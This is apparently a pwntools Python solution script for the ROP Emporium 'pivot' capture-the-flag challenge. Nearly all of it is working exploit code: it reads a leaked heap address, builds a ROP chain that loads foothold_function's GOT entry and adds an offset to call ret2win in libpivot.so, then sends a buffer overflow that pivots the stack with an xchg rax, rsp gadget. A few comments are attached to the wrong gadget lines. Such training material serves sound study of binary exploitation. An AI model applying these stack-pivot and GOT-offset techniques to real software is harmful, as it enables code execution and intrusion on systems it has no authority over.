from pwn import *

#declaring binary, elfs, rops
context.binary = binary = './pivot'
elf = ELF(binary)
rop = ROP(elf)
io = process(binary)

#extracting leaked pivot point
io.recvuntil(b'pivot: ')
buffer = int(io.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

#function addresses
#0x0000000000000a81 <ret2win> looks ok
#000000000000096a foothold offset from libpivot.so looks okay
#0x0000000000400720 <foothold_function> .plt
#0x000000602048  foothold_function .got address
ret2win_offset = 0x0000000000000a81
foothold_offset = 0x000000000000096a
add_offset = ret2win_offset - foothold_offset
foothold_plt = 0x0000000000400720
foothold_got = 0x000000602048


#useful gadgets
#0x00000000004009bb: pop rax; ret;
#0x00000000004009c0: mov rax, qword ptr [rax]; ret;
#0x00000000004007c8: pop rbp; ret;
#0x00000000004009c4: add rax, rbp; ret;
#0x00000000004006b0: call rax;
#0x00000000004009bd: xchg rax, rsp; ret;
xchg_rax = 0x00000000004009bd
pop_rax = 0x00000000004009bb
add_rax_rbp = 0x00000000004009c4
pop_rbp = 0x00000000004007c8
load_rax = 0x00000000004009c0
call_rax = 0x00000000004006b0

#payloads, gadgets, rop chain
padding = b"A"*40         	#filling buffer with junk
#stack pivot in heap
rop.call(p64(foothold_plt))
rop.call(p64(pop_rax))		#pop rax; ret; pop rax to get foothold address in it
rop.call(p64(foothold_got))
rop.call(p64(load_rax))		#pop rbp; ret; poping rbp to store our offset 0x14e,calculated by subtracting func address of ret2win
				#and foothold_function using `objdump -d ./libpivot.so  | grep <func_name>`

rop.call(p64(pop_rbp))		#normal address of foothold_function into rax
rop.call(p64(add_offset))					#offset into rbp

rop.call(p64(add_rax_rbp))		#add rax, rbp; ret;
rop.call(p64(call_rax))		#mov rax, qword ptr [rax]; ret; move the actual value into rax

log.info("sending heap data for the stack pivot")


#rop.call(elf.symbols.foothold_function)

payload = flat(
	rop.chain())

io.sendline(payload)
io.recvrepeat(0.2)
log.info("sending first bof - stack pivoting")

#processes, interaction
payload = padding
payload += p64(pop_rax)
payload += p64(buffer)
payload += p64(xchg_rax)

io.sendline(payload)
io.recvuntil(b"foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so")
log.success( io.recvall())

io.interactive()
